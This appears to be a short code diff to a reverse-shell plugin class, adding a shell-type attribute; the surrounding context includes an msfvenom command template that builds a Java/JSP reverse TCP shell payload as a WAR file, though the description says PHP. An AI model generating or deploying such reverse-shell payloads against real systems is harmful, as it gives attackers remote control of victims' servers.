@@ -7,6 +7,7 @@ class ReverseTCP(plugin.ReverseShell):
 
         self.opts.description = "[ReverseShell][TCP] PHP from swisskyrepo/PayloadsAllTheThings. License MIT."
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
+        self.shell_type = "tcp"
 
     def make_shell(self):
         self.shell = """msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f war > reverse.war
